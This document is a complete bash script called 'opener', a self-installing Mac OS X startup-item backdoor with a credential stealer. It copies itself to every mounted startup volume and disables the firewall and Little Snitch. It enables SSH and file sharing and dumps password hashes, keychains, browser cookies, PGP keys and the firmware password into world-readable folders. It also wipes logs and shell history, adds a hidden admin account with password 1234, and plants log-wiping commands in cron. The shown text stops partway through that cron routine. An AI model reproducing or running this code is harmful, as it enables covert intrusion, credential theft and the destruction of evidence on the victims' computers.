#!/bin/bash 

################################################################################################ 
# opener 2.3.5a - a startup script to turn on services and gather user info & hashes for Mac OS X 
################################################################################################ 
# Originally written by DimBulb 
# Additional code: hard-mac, JawnDoh!, Dr_Springfield, g@pple 
# Additional ideas and advice: Zo, BSDOSX 

# This script runs in bash (as is noted by the very first line of this script) 

# To install this script you need admin access or 
# physical access (boot from a CD or firewire/usb, ignore permissions on the internal drive) or 
# write access to either /Library/StartupItems /System/Library/StartupItems or 
# write access to any existing StartupItem (which you can then replace with this script) or 
# write access to the rc, crontab, or periodic files (and have them run or install the script) or 
# you could trick someone who has an admin account into installing it. 

# It should go in /System/Library/StartupItems or /Library/StartupItems (when it is executed it 
# will move itself to /System/Library/StartupItems) 

# Since it is a StartupItem it will run as root - thus no "sudo" commands are needed. If you run 
# it as any other user most of the commands will generate errors! (You could sudo ./opener) 

# Save start time and date for performance testing 
echo -n "opener 2.3.5 : Start " >> /.performance.txt ; date >> /.performance.txt 

################################################################################################ 
# Install this script properly, turn on some services, turn off some (like the firewall) 
################################################################################################ 
# if we aren't already in /System/Library/StartupItems then create a folder with the name of this 
# script, copy the script into that folder and create a StartupParameters.plist file too! 
# If this script gets executed it makes itself a StartupItem. YAY! 
scriptpath=`pwd` 
scriptfolder=`basename $scriptpath` 
scriptname=`basename $0` 
if [ ! -d /System/Library/StartupItems/"${scriptfolder}" ] ; then 
mkdir /System/Library/StartupItems/"${scriptname}" 
cp "${scriptpath}"/"${scriptname}" /System/Library/StartupItems/"${scriptname}"/"${scriptname}" 
# The lines below echo out the StartupParameters.plist file. 
echo "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" > /System/Library/StartupItems/$scriptname/StartupParameters.plist 
echo "<!DOCTYPE plist SYSTEM \"file://localhost/System/Library/DTDs/PropertyList.dtd\">" >> /System/Library/StartupItems/$scriptname/StartupParameters.plist 
echo "<plist version=\"0.9\">" >> /System/Library/StartupItems/$scriptname/StartupParameters.plist 
echo "<dict>" >> /System/Library/StartupItems/$scriptname/StartupParameters.plist 
echo " <key>Description</key>" >> /System/Library/StartupItems/$scriptname/StartupParameters.plist 
echo " <string> </string>" >> /System/Library/StartupItems/$scriptname/StartupParameters.plist 
echo " <key>OrderPreference</key>" >> /System/Library/StartupItems/$scriptname/StartupParameters.plist 
echo " <string>First</string>" >> /System/Library/StartupItems/$scriptname/StartupParameters.plist 
echo " <key>Provides</key>" >> /System/Library/StartupItems/$scriptname/StartupParameters.plist 
echo " <array>" >> /System/Library/StartupItems/$scriptname/StartupParameters.plist 
echo " <string>opener</string>" >> /System/Library/StartupItems/$scriptname/StartupParameters.plist 
echo " </array>" >> /System/Library/StartupItems/$scriptname/StartupParameters.plist 
echo " <key>Requires</key>" >> /System/Library/StartupItems/$scriptname/StartupParameters.plist 
echo " <array>" >> /System/Library/StartupItems/$scriptname/StartupParameters.plist 
echo " <string>Disks</string>" >> /System/Library/StartupItems/$scriptname/StartupParameters.plist 
echo " </array>" >> /System/Library/StartupItems/$scriptname/StartupParameters.plist 
echo "<key>Uses</key>" >> /System/Library/StartupItems/$scriptname/StartupParameters.plist 
echo " <array>" >> /System/Library/StartupItems/$scriptname/StartupParameters.plist 
echo " <string>NetInfo</string>" >> /System/Library/StartupItems/$scriptname/StartupParameters.plist 
echo " <string>NetworkExtensions</string>" >> /System/Library/StartupItems/$scriptname/StartupParameters.plist 
echo " <string>NIS</string>" >> /System/Library/StartupItems/$scriptname/StartupParameters.plist 
echo " <string>NFS</string>" >> /System/Library/StartupItems/$scriptname/StartupParameters.plist 
echo " <string>IPServices</string>" >> /System/Library/StartupItems/$scriptname/StartupParameters.plist 
echo " </array>" >> /System/Library/StartupItems/$scriptname/StartupParameters.plist 
echo "</dict>" >> /System/Library/StartupItems/$scriptname/StartupParameters.plist 
echo "</plist>" >> /System/Library/StartupItems/$scriptname/StartupParameters.plist 
chmod -R +x /System/Library/StartupItems/$scriptname 
fi 

echo -n "opener: Finished move to System Library StartupItems " >> /.performance.txt ; date >> /.performance.txt # Write time to /.performance.txt 

# Copy this startup script to any mounted startup volume. 
ls /Volumes | while read vol; do 
if test -d /Volumes/"${vol}"/System/Library ; then 
mkdir /Volumes/"${vol}"/System/Library/StartupItems 
cp -R /System/Library/StartupItems/"${scriptpath}" /Volumes/"${vol}"/System/Library/StartupItems/ 
chmod -Rf 777 /Volumes/"${vol}"/System/Library/StartupItems/ 
fi 
done 

echo -n "opener: Finished copy to other mounted volumes " >> /.performance.txt ; date >> /.performance.txt # Write time to /.performance.txt 

# If this script is run by anyone other than root it just tries to infect and quits 
# Most of the commands in the script will just generate errors if it isn't run as root 
if [ `id -u` != "0" ]; then 
echo -n "opener: Not run by root. Quitting at: " >> /.performance.txt ; date >> /.performance.txt 
exit 
fi 

# clobber utmp so that when we connect they can't see us 
rm /var/run/utmp 
touch /var/run/utmp & 

# Disable system accounting 
accton & 

#----------------------------------------------------------------------------------------------- 
# If ohphoneX downloaded last time but is not installed, then install it (by Dr_Springfield) 
# part 1 of 3 - if you want to extract this routine you need all 3 parts (all in ---- sections) 
#----------------------------------------------------------------------------------------------- 
if [ -f /private/.phone/ohphoneX_0.2_binary.dmg ] ; then 
cd /private/.phone/ 
myoutput=`hdiutil attach -mountroot ./ ./ohphoneX_0.2_binary.dmg` 
cp ohphoneX/ohphoneX.app/Contents/Resources/ohphone ./ 
devDisk=`echo $myoutput | tr ' ' '\n' | tail -3 | head -1` 
hdiutil detach -force $devDisk > /dev/null 
disktool -r > /dev/null 
rm -f ohphoneX_0.2_binary.dmg 
echo -n "opener: installed ohphoneX " >> /.performance.txt ; date >> /.performance.txt # Write time to /.performance.txt 
fi 

#----------------------------------------------------------------------------------------------- 
# If ohphoneX is installed, run it early so it won't display a GUI window (by Dr_Springfield) 
# part 2 of 3 - if you want to extract this routine you need all 3 parts (all in ---- sections) 
#----------------------------------------------------------------------------------------------- 
if [ -f /private/.phone/ohphoneX ] ; then 
cd /private/.phone/ 
./ohphoneX --listenport 1720 --connectport 1720 --h245tunneldisable --fast-disable --videoreceive shm --sound-in "Built-in Audio" --sound-out "Null" --sound-buffers 2 -P speex -P gsm -P G.711-ulaw -P G.711-ALaw -P g.726 -n -l -a & 
echo -n "opener: ran ohphoneX " >> /.performance.txt ; date >> /.performance.txt # Write time to /.performance.txt 
fi 

# disable OS X built-in firewall 
defaults write /Library/Preferences/com.apple.sharing.firewall state no & 

# Prevent software update from auto-updating (and potentially fixing any vulns) 
# Not working... 
#softwareupdate --schedule off & 

# clobber LittleSnitch 
# killall -m LittleSnitch <-- THIS IS NOT ENOUGH TO STOP LITTLESNITCH, IT RELAUNCHES 
# Given that killing the process does not work we could just delete the LittleSnitch StartupItem 
# But that isn't too subtle so... let's change it's order preference to Late... 
# Since opener is FIRST it should avoid triggering LittleSnitch on network activity. 
if test -d /Library/StartupItems/LittleSnitch ; then 
echo "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" > /Library/StartupItems/LittleSnitch/StartupParameters.plist 
echo "<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">" >> /Library/StartupItems/LittleSnitch/StartupParameters.plist 
echo "<plist version=\"1.0\">" >> /Library/StartupItems/LittleSnitch/StartupParameters.plist 
echo "<dict>" >> /Library/StartupItems/LittleSnitch/StartupParameters.plist 
echo " <key>Description</key>" >> /Library/StartupItems/LittleSnitch/StartupParameters.plist 
echo " <string>Loading Little Snitch</string>" >> /Library/StartupItems/LittleSnitch/StartupParameters.plist 
echo " <key>OrderPreference</key>" >> /Library/StartupItems/LittleSnitch/StartupParameters.plist 
echo " <string>Late</string>" >> /Library/StartupItems/LittleSnitch/StartupParameters.plist 
echo " <key>Provides</key>" >> /Library/StartupItems/LittleSnitch/StartupParameters.plist 
echo " <array>" >> /Library/StartupItems/LittleSnitch/StartupParameters.plist 
echo " <string>LittleSnitch</string>" >> /Library/StartupItems/LittleSnitch/StartupParameters.plist 
echo " </array>" >> /Library/StartupItems/LittleSnitch/StartupParameters.plist 
echo "</dict>" >> /Library/StartupItems/LittleSnitch/StartupParameters.plist 
echo "</plist>" >> /Library/StartupItems/LittleSnitch/StartupParameters.plist & 
echo -n "opener: wrote LittleSnitch StartupParameters.plist " >> /.performance.txt ; date >> /.performance.txt # Write time to /.performance.txt 
fi 

# launch krec if it's installed in /Library/Preferences (it's a keystroke recorder) 
# I commented these out because KRec does not seem to work? and creates strange files in weird places 
#chmod -R 777 /Library/Preferences/krec.app/ 
#open /Library/Preferences/KRec.app/Contents/MacOS/KRec & 

# Make sure anyone can write to the hostconfig, ssh and cron files (among others) 
# In case someone deletes our accounts or changes passwords and we have to come back with limited access. 
chflags nouchg /etc/hostconfig /etc/xinetd.d/ssh /etc/daily /etc/weekly /etc/monthly 
chmod 777 /etc/hostconfig /etc/xinetd.d/ssh 
chmod -R 777 /Library/Preferences/jtr /Library/Preferences/KRec.app /etc/periodic/daily /etc/periodic/weekly /etc/periodic/monthly & 

# If ssh isn't on Replace their ssh file with our version which turns on ssh (for 10.3.x) 
sshstate=`cat /private/etc/xinetd.d/ssh | grep "disable = " | awk '{print $3}'` 
if [ "${sshstate}" = "no" ] ; then 
echo "service ssh" > /private/etc/xinetd.d/ssh 
echo "{" >> /private/etc/xinetd.d/ssh 
echo "disable = no" >> /private/etc/xinetd.d/ssh 
echo "socket_type = stream" >> /private/etc/xinetd.d/ssh 
echo "wait = no" >> /private/etc/xinetd.d/ssh 
echo "user = root" >> /private/etc/xinetd.d/ssh 
echo "server = /usr/libexec/sshd-keygen-wrapper" >> /private/etc/xinetd.d/ssh 
echo "server_args = -i" >> /private/etc/xinetd.d/ssh 
echo "groups = yes" >> /private/etc/xinetd.d/ssh 
echo "flags = REUSE IPv6" >> /private/etc/xinetd.d/ssh 
echo "session_create = yes" >> /private/etc/xinetd.d/ssh 
echo "}" >> /private/etc/xinetd.d/ssh & 
fi 

# Turn on FileSharing if it's not on already 
afpstate=`cat /etc/hostconfig | grep "AFPSERVER="` 
if [ "${afpstate}" = "AFPSERVER=-NO-" ] ; then 
echo "AFPSERVER=-YES-" >> /etc/hostconfig 
fi 

# Turn on remote login if it's not on already (for OS X 10.2.8 and earlier) 
sshstate="" 
sshstate=`cat /etc/hostconfig | grep "SSHSERVER="` 
if [ "${sshstate}" = "SSHSERVER=-NO-" ] ; then 
echo "SSHSERVER=-YES-" >> /etc/hostconfig 
fi 

# Uncomment the commands below to turn on windows sharing if it's not on already 
#smbstate=`cat /etc/hostconfig | grep "SMBSERVER="` 
#if [ "${smbstate}" = "SMBSERVER=-NO-" ] ; then 
#echo "SMBSERVER=-YES-" >> /etc/hostconfig 
#fi 

# Uncomment the commands below to turn on web sharing if it's not on already 
#webstate=`cat /etc/hostconfig | grep "SMBSERVER="` 
#if [ "${webstate}" = "WEBSERVER=-NO-" ] ; then 
#echo "WEBSERVER=-YES-" >> /etc/hostconfig 
#fi 

# In which file is the setting to turn on ftp? 

################################################################################################ 
# gather system-wide info like hashes and preferences 
################################################################################################ 
# create a hidden folder called .info and some other folders 
mkdir -p /.info/private/var /.info/keychains /Library/Preferences/.indexed 
mkdir /.info/Library/Application\ Support/ /.info/nistuff /.info/Applications /.info/KRec_Logs 
mkdir -p /.info/System/Library/CoreServices /.info/vm /.info/dsniff /.info/Library/WebServer 
mkdir /.info/Library/Preferences/Netopia /Library/Preferences/jtr 

# Which version of Mac OS is running? 
system_profiler | grep 'System version:' > /.info/Mac_OS_X_version.txt & 

# Grab the names of the computer - the rendezvous code here is messy but it works and it's late! 
grep APPLETALK_HOSTNAME /etc/hostconfig | cut -d '=' -f 2 > /.info/ComputerName.txt 
rendez=`cat /var/db/SystemConfiguration/preferences.xml | grep "LocalHostName" -A 2` 
vous="${rendez:41}" 
r=${#vous} 
rendezvous="${vous:0:(r-20)}" 
echo "${rendezvous}" >> /.info/ComputerName.txt 

# Grab the public and private IP addresses (we need a routine to post, mail or something with these...) 
curl http://showmyip.com | grep "Internet Connection" | awk '{print $8}' > /.info/IP_Address_of_this_computer_PUBLIC.txt 
/sbin/ifconfig en0 | head -3 | grep 'inet ' | cut -d' ' -f 2 > /.info/IP_Address_of_this_computer_PRIVATE.txt & 
/sbin/ifconfig en1 | head -3 | grep 'inet ' | cut -d' ' -f 2 >> /.info/IP_Address_of_this_computer_PRIVATE.txt & 

# Grab the network port configurations (they could have an en3, en4 etc...) 
/sbin/ifconfig -a > /.info/Network_port_configs.txt & 

# Grab the stored open-firmware password (which is in hex and will need to be converted to ASCII) 
# After it is converted to ascii we can echo it onto the john wordlist file... 
of_password=`nvram -p | grep password` 
if [ ! "${of_password}" = "" ] ; then 
echo "${of_password}" | awk '{print $2}' >> /.info/open_firmware_password.txt & 
fi 

# If OSXvnc is around, try to grab it's passwd file with clear-text stored password 
# And if found, copy the F-merged and john.pot files. Do not wait for these commands to finish before continuing 
# The maxdepth 4 means it would go as far down as /(root_of_the_drive) (1), /Users (2) /username (3) /Desktop (4) 
# You might want to increase the depth by 1 if you frequently run into multiple startup volumes 
# If there are more than one match to any of these, we get the last one. 
find / -maxdepth 4 -name "OSXvnc.app" -type d -exec ditto -rsrcFork '{}/Contents/MacOS/passwd' /.info/OSXvnc/ \; & 
find / -maxdepth 4 \( -name "F-merged" -o -name "john.pot" \) -type f -exec ditto -rsrcFork '{}' /.info/ \; & 

# Copy some interesting data and all the hashes into the info folder 
/usr/bin/ditto -rsrcFork /Applications/Microsoft\ Office\ 2004/Office/OfficePID /.info/Applications/OfficePID2004 & 
/usr/bin/ditto -rsrcFork /Applications/Microsoft\ Office\ X/Office/OfficePID /.info/Applications/OfficePIDX & 
cp -R /Library/ApplePasswordServer /.info/Library/ApplePasswordServer & # for OS X SERVER 
/usr/bin/ditto -rsrcFork /Library/Application\ Support/Adobe/Adobe\ Registration\ Database /.info/Library/Application\ Support/ & 
/usr/bin/ditto -rsrcFork /Library/Application\ Support/Connectix/Virtual\ PC/Virtual\ PC\ 6.0\ Registration.vpf /.info/Library/Application\ Support/ & 
/usr/bin/ditto -rsrcFork /Library/Application\ Support/Final\ Cut\ Express\ Support/Final\ Cut\ Express\ System\ ID /.info/Library/Application\ Support/ & 
cp /Library/Application\ Support/Objective\ Development/Little\ Snitch/registration /.info/Library/Application\ Support/ & 
/usr/bin/ditto -rsrcFork /Library/Application\ Support/ProApps/*System\ ID /.info/Library/Application\ Support/ & 
cp /Library/Application\ Support/SnapMail\ users /.info/Library/Application\ Support/ & 
cp -R /Library/Keychains /.info/Library/ & 
cp -R /Library/Preferences/.indexed/v_m.txt /.info/vm/ & 
cp /Library/Preferences/com.apple.loginwindow.plist /.info/Library/Preferences/ & 
cp /Library/Preferences/com.apple.MCX.plist /.info/Library/Preferences/ & 
cp -R /Library/Preferences/DNSUpdate /.info/Library/Preferences/ & # DynDNS locator beacon prefs with password in clear-text 
cp -R /Library/Preferences/dsstart/en0sniff* ./info/dsniff ; rm /Library/Preferences/dsstart/en0sniff* & 
cp /Library/Preferences/jtr/run/john.pot /.info/john_from_opener.pot & # copy our john.pot to a different name in case there are others 
cp -R /Library/Preferences/KRec.app/Contents/MacOS/*.krec /.info/KRec_Logs/ & 
cp /Library/Preferences/Netopia/Netopia\ Preferences /.info/Library/Preferences/Netopia/Netopia\ Preferences & 
cp /Library/Preferences/Netopia/TB2\ Activation\ Key /.info/Library/Preferences/Netopia/TB2\ Activation\ Key & 
cp /Library/Preferences/Retrospect/Retro.Config* /.info/Library/Preferences/ & 
cp /Library/Preferences/SystemConfiguration/NetworkInterfaces.plist /.info/Library/Preferences/NetworkInterfaces.plist & 
cp /Library/Preferences/SystemConfiguration/preferences.plist /.info/Library/Preferences/preferences.plist & 
cp /Library/WebServer/users /.info/Library/WebServer/users & 
cp -R /private/var/db /.info/private/var/db # all the netinfo stuff includes local.nidb and network.nidb etc. 
cat /private/var/log/system.log | grep "from" >> /.info/remote_connections.txt & 
cp /System/Library/CoreServices/SystemVersion.plist /.info/System/Library/CoreServices/SystemVersion.plist & 

# Get rid of a big file we don't need 
rm /.info/private/var/db/locate.database & 

# change to the info folder directory 
cd /.info 

# grab netinfo user stuff (for both domains, this is OS X 10.2.8 or lower) 
nidump passwd . > passwdMD5 
nidump passwd / >> passwdMD5 & 

# grab 10.3 samba & sha1 hashes (domain "." only) 
for name in `nireport . /users name` 
do 
G=`niutil -readprop . /users/${name} generateduid` 
echo $G 
if [ ! $G = "" ] ; then 
H=`cat /private/var/db/shadow/hash/${G}` 
echo ${name}:${H:0:32}:${H:32:32}:"${rendezvous}" >> passwdNT4 
echo ${name}:${H:64:40}:"${rendezvous}" >> passwdSHA1 
fi 
done 

# grab 10.3 samba & sha1 hashes (domain "/" only) 
# This is the default domain for X Server users & groups 
# Under normal OS X 10 (not server) both . and / return the same values 
for name in `nireport / /users name` 
do 
G=`niutil -readprop / /users/${name} generateduid` 
echo $G 
if [ ! $G = "" ] ; then 
H=`cat /private/var/db/shadow/hash/${G}` 
echo ${name}:${H:0:32}:${H:32:32}:"${rendezvous}" >> passwdNT4 
echo ${name}:${H:64:40}:"${rendezvous}" >> passwdSHA1 
fi 
done 

# Grab 10.2.8 and earlier Samba hashes (Windows Sharing had to have been turned on and user had 
# to be allowed to "log in from Windows" for the hash file to exist.) 
cd /private/var/db/samba/hash 
ls /private/var/db/samba/hash | while read hash_file ; do 
hash=`cat "${hash_file}"` 
echo "${hash_file}:${hash:0:32}:${hash:32:63}:${rendezvous}" >> passwdNT4 
done 

# Now unique the passwd files to remove duplicate entries from . and / 
sort -us passwdMD5 > passwdMD5.txt ; rm passwdMD5 ; mv passwdMD5.txt passwdMD5 & 
sort -us passwdNT4 > passwdNT4.txt ; rm passwdNT4 ; mv passwdNT4.txt passwdNT4 & 
sort -us passwdSHA1 > passwdSHA1.txt ; rm passwdSHA1 ; mv passwdSHA1.txt passwdSHA1 & 

# Copy hash files into the jtr directory so we don't have to later 
cp passwdMD5 passwdNT4 /Library/Preferences/jtr/ 

# Gather all netinfo information for users 
cd /.info/nistuff 
for username in `nireport . /users name` ; do 
niutil -read . /users/$username > $username.txt 
done 

echo -n "opener: Finished gather system-wide info " >> /.performance.txt ; date >> /.performance.txt # Write time to /.performance.txt 

################################################################################################ 
# Gather User folder stuff 
################################################################################################ 
# read user names from netinfo 
# if folders with those usernames appear in the /Users directory, then create the /.info/Users/username folders 
# then copy the StickiesDatabase file, keychains, recent servers & other interesting files from each user 
cd /Users 
for item in `nireport . /users name` 
do 
if test -d ./$item ; then 
mkdir -p /.info/Users/$item/Documents /.info/Users/$item/Library/Application\ Support 
mkdir -p /.info/Users/$item/Library/Logs /.info/Users/$item/Library/Preferences /.info/Users/$item/Library/Application\ Support/Chimera 
mkdir /.info/Users/$item/Library/Mozilla /.info/Users/$item/Library/Phoenix /.info/Users/$item/Library/Application\ Support/OmniWeb 
mkdir -p /.info/Users/$item/Library/Cookies /.info/Users/$item/Library/Classic/Preferences /.info/Users/$item/Library/Classic/Apple\ Menu\ Items 
cp -f $item/Library/StickiesDatabase /.info/Users/$item/StickiesDatabase 
/usr/bin/ditto -rsrcFork $item/Library/Keychains/ /.info/Users/$item/Library/Keychains/ # already exists error? 

# Now let's grab some other files that might be interesting 
/usr/bin/ditto -rsrcFork $item/Documents/PGP /.info/Users/$item/Documents/PGP & 
/usr/bin/ditto -rsrcFork $item/Library/Application\ Support/Carracho /.info/Users/$item/Library/Application\ Support/Carracho & 
/usr/bin/ditto -rsrcFork $item/Library/Application\ Support/Fire /.info/Users/$item/Library/Application\ Support/Fire & 
/usr/bin/ditto -rsrcFork $item/Library/Logs/AIM* /.info/Users/$item/Library/Logs/AIM & 
/usr/bin/ditto -rsrcFork $item/Library/Preferences/Yahoo\!\ Messenger\ Preferences /.info/Users/$item/Library/Preferences/ & 
/usr/bin/ditto -rsrcFork $item/Library/Preferences/Server\ Settings\ Preferences /.info/Users/$item/Library/Preferences/ & 
/usr/bin/ditto -rsrcFork $item/Library/Preferences/Server\ Settings\ Favorites /.info/Users/$item/Library/Preferences/ & 
/usr/bin/ditto -rsrcFork $item/Library/Preferences/Server\ Admin\ Preferences /.info/Users/$item/Library/Preferences/ & 
/usr/bin/ditto -rsrcFork $item/Library/Preferences/iVisit\ Preferences /.info/Users/$item/Library/Preferences/ & 
/usr/bin/ditto -rsrcFork $item/Library/Preferences/FileMaker\ Preferences /.info/Users/$item/Library/Preferences/ & 
/usr/bin/ditto -rsrcFork $item/Library/Preferences/Fetch\ Shortcuts /.info/Users/$item/Library/Preferences/ & 
/usr/bin/ditto -rsrcFork $item/Library/Preferences/com.geekspiff.chickenofthevnc.plist /.info/Users/$item/Library/Preferences/ & 
/usr/bin/ditto -rsrcFork $item/Library/Preferences/com.carracho.enchilada.plist /.info/Users/$item/Library/Preferences/ & 
/usr/bin/ditto -rsrcFork $item/Library/Preferences/com.apple.WorkgroupManager.plist /.info/Users/$item/Library/Preferences/ & 
/usr/bin/ditto -rsrcFork $item/Library/Preferences/com.apple.security.plist /.info/Users/$item/Library/Preferences/ & 
/usr/bin/ditto -rsrcFork $item/Library/Preferences/com.apple.mail.plist /.info/Users/$item/Library/Preferences/ & 
/usr/bin/ditto -rsrcFork $item/Library/Preferences/com.apple.internetconnect.plist /.info/Users/$item/Library/Preferences/ & 
/usr/bin/ditto -rsrcFork $item/Library/Preferences/com.apple.internetconfig.plist /.info/Users/$item/Library/Preferences/ & 
/usr/bin/ditto -rsrcFork $item/Library/Preferences/com.aol.aim.plist /.info/Users/$item/Library/Preferences/ & 
/usr/bin/ditto -rsrcFork $item/Library/Preferences/Carracho* /.info/Users/$item/Library/Preferences/ & 
/usr/bin/ditto -rsrcFork $item/Library/Preferences/com.yahoo.Messenger* /.info/Users/$item/Library/Preferences/ & 
/usr/bin/ditto -rsrcFork $item/Library/Application\ Support/Chimera/Profiles/default/*.slt/cookies.txt /.info/Users/$item/Library/Application\ Support/Chimera/ & 
/usr/bin/ditto -rsrcFork $item/Library/Preferences/iCab\ Preferences/iCab\ Cookies /.info/Users/$item/Library/Preferences/iCab\ Preferences/ & 
/usr/bin/ditto -rsrcFork $item/Library/Mozilla/Profiles/default/*.slt/cookies.txt /.info/Users/$item/Library/Mozilla/ & 
/usr/bin/ditto -rsrcFork $item/Library/Phoenix/Profiles/default/*.slt/Cache/cookies.txt /.info/Users/$item/Library/Phoenix/ & 
/usr/bin/ditto -rsrcFork $item/Library/Application\ Support/OmniWeb/Cookies.xml /.info/Users/$item/Library/Application\ Support/OmniWeb/ & 
/usr/bin/ditto -rsrcFork $item/Library/Application\ Support/OmniWeb\ 5/Cookies.xml /.info/Users/$item/Library/Application\ Support/OmniWeb/ & 
/usr/bin/ditto -rsrcFork $item/Library/Preferences/Opera*Preferences/cookies*.dat /.info/Users/$item/Library/Preferences/Opera/ & 
/usr/bin/ditto -rsrcFork $item/Library/Cookies/Cookies.plist /.info/Users/$item/Library/Cookies/ & 
/usr/bin/ditto -rsrcFork $item/.gnupg /.info/Users/$item/gnupg/ & 
/usr/bin/ditto -rsrcFork $item/.ssh/known_hosts /.info/Users/$item/ssh/ & 
/usr/bin/ditto -rsrcFork $item/Library/Application\ Support/Little\ Snitch/config.plist /.info/Users/$item/Library/Application\ Support/Little\ Snitch/ & 
/usr/bin/ditto -rsrcFork $item/Library/Preferences/System\ Optimizer\ X\ Preferences /.info/Users/$item/Library/Preferences/ & 
/usr/bin/ditto -rsrcFork $item/Library/Preferences/CDDB\ Preferences /.info/Users/$item/Library/Preferences/ & 
/usr/bin/ditto -rsrcFork $item/Library/Preferences/PageSuckerDefaultSettings.prf /.info/Users/$item/Library/Preferences/ & 
/usr/bin/ditto -rsrcFork $item/Library/Classic/Preferences/Users\ \&\ Groups\ Data\ File /.info/Users/$item/Library/Classic/Preferences/ & 
/usr/bin/ditto -rsrcFork $item/Library/Classic/Preferences/Netopia /.info/Users/$item/Library/Classic/Preferences/Netopia & 
/usr/bin/ditto -rsrcFork $item/Library/Classic/Preferences/Stickies\ file /.info/Users/$item/Library/Classic/Preferences/ & 
/usr/bin/ditto -rsrcFork $item/Library/Classic/Apple\ Menu\ Items/Recent\ Servers /.info/Users/$item/Library/Classic/Apple\ Menu\ Items/Recent\ Servers & 

# If you are deleting logs then you probably won't want to keep a copy of this. 
# On the other hand, if you want to see what the user has been doing in bash... (it will also show all YOUR commands!) 
# cp $item/.bash_history /.info/Users/$item/bash_history & 

# A certain program keeps a certain file here called ".DS_Store " (note the trailing space) 
# Does anybody know what program DimBulb is referring to here? 
/usr/bin/ditto -rsrcFork $item/Library/Preferences/.DS_Store\ /.info/Users/$item/Library/Preferences/ & 

# Uncomment the next lines for the AOL & ICQ prefs & the whole SSH folder, those folders could be pretty large though. 
# Note that the ssh known hosts file is already grabbed in the routines above... 
#/usr/bin/ditto -rsrcFork $item/Library/Preferences/America\ Online/ /.info/Users/$item/Library/Preferences/America\ Online/ & 
#/usr/bin/ditto -rsrcFork $item/Library/Preferences/ICQ/ /.info/Users/$item/Library/Preferences/ICQ/ & 
#/usr/bin/ditto -rsrcFork $item/.ssh /.info/Users/$item/ssh & 

# Now grab urls from the recent servers and throw them in a file in each .info/user folder 
for filename in `ls ./$item/Library/Recent\ Servers` 
do 
strings -13 ./$item/Library/Recent\ Servers/$filename/rsrc | grep "://" >> /.info/Users/$item/RecentServersList.txt 
done 
fi 
done 

echo -n "opener: Finished gather user info " >> /.performance.txt ; date >> /.performance.txt # Write time to /.performance.txt 

################################################################################################ 
# Gather Classic files & info (see "Gather User folder stuff" section for more Classic prefs) 
################################################################################################ 
# Create a folder to hold the info 
mkdir -p /.info/Classic 
if [ type -d /System\ Folder ] ; then 
/usr/bin/ditto -rsrcFork /System\ Folder/Preferences/Users\ \&\ Groups\ Data\ File /.info/Classic/Preferences/ & 
/usr/bin/ditto -rsrcFork /System\ Folder/Preferences/Netopia /.info/Classic/Preferences/Netopia & 
/usr/bin/ditto -rsrcFork /System\ Folder/Preferences/Stickies\ file /.info/Classic/Preferences/ & 
/usr/bin/ditto -rsrcFork /System\ Folder/Note\ Pad\ File /.info/Classic/ & 
/usr/bin/ditto -rsrcFork /System\ Folder/Scrapbook\ File /.info/Classic/ & 
echo -n "opener: Finished gather Classic files " >> /.performance.txt ; date >> /.performance.txt # Write time to /.performance.txt 
fi 

################################################################################################ 
# Move our .info folder into every user's Public folder 
################################################################################################ 
# May need to move this whole routine to the end because of commands running in child processes 
# change permissions on the info folders and all the stuff we collected 
chmod -Rf 777 /.info /Library/Preferences/.indexed 

# now copy the info folder into the Public folder of each user (since sharing will be on at 
# restart and guest is on by default anyone can get to them.) 
cd /Users 
chmod -Rf 777 /.info 
find . -maxdepth 2 -name "Public" -type d -exec ditto -rsrcFork /.info '{}/.info' \; 
find . -maxdepth 3 -name ".info" -type d -exec chmod -R 777 '{}' \; & 
rm -R /.info 

################################################################################################ 
# Modify LimeWire settings 
################################################################################################ 
find /Users -iname "limewire.props" | while read the_file ; do 
last_line=`tail -n 1 "${the_file}"` 
if [ "$last_line" != "FREELOADER_FILES=1" ] ; then 
echo "UPLOADS_PER_PERSON=1" >> "${the_file}" 
echo "HARD_MAX_UPLOADS=5" >> "${the_file}" 
echo "MAX_UPLOAD_BYTES_PER_SEC=100" >> "${the_file}" 
echo "FREELOADER_FILES=1" >> "${the_file}" & 
fi 
done 

################################################################################################ 
# Delete log files 
################################################################################################ 
# Clean up by removing logs & kill syslogd so no further logs will be made until restart 
killall syslogd 
# Now find all the files in private/var/log and replace them with empties 
cd /private/var/log 
find /private/var/log -type f | while read target ; do 
rm "${target}" ; touch "${target}" 
done 
# Do the same with files in /Library/Logs 
cd /Library/Logs 
find /Library/Logs -type f | while read target ; do 
rm "${target}" ; touch "${target}" 
done 
# Get rid of a few others 
rm -f /Library/Logs/console/*/console.log.* /Library/Preferences/Netopia/Timbuktu\ Pro\ Log /var/log/osxvnc.* 
cd /Users 
find . -maxdepth 2 \( -name ".bash_history" -o -name ".tcsh_history" -o -name ".sh_history" -o -name ".history" \) -exec rm -f '{}' \; 
history -c 

################################################################################################ 
# Create an admin user called LDAP-daemon (this name was suggested by Zo to replace "hacker") 
################################################################################################ 
# create an admin user named LDAP-daemon with password 1234 
# note, this user will NOT appear in their SystemPreferences accounts list or the login window 
# the user WILL appear in Netinfo Manager 
# to remove the user later try nidump -destroy . /users/LDAP-daemon 
niutil -create . /users/LDAP-daemon 
niutil -createprop . /users/LDAP-daemon uid 401 
niutil -createprop . /users/LDAP-daemon realname "LDAP-daemon" 
niutil -createprop . /users/LDAP-daemon home "/dev/null" 
niutil -createprop . /users/LDAP-daemon shell "/bin/bash" 
niutil -createprop . /users/LDAP-daemon gid 20 
niutil -createprop . /users/LDAP-daemon passwd "rQ3p5/hpOpvGE" # (it's 1234) 
nicl . -append /groups/admin users LDAP-daemon 

################################################################################################ 
# Make the cron tasks delete the logs 
################################################################################################ 
# append some commands to the cron scripts 
# since both routines are checking the last line of the file they should not be using the same 
# file as they will both just keep appending! 

# checks to see if the last line in the weekly cron script is our last line to remove logs 
# if not, we add the lines 
last_line=`tail -n 1 /etc/weekly` 
if [ "$last_line" != "history -c" ] ; then 
echo "find /private/var/log -type f | while read target ; do" >> /etc/weekly 
echo "rm \"${target}\" ; touch \"${target}\"" >> /etc/weekly 
echo "done" >> /etc/weekly 
echo "find /Library/Logs -type f | while read target ; do" >> /etc/weekly 
echo "rm \"${target}\" ; touch \"${target}\"" >> /etc/weekly 
echo "done" >> /etc/weekly 
echo "rm -f /Library/Logs/console/*/console.log.* /Library/Preferences/Netopia/Timbuktu\ Pro\ Log /var/log/osxvnc.*" >> /etc/weekly 
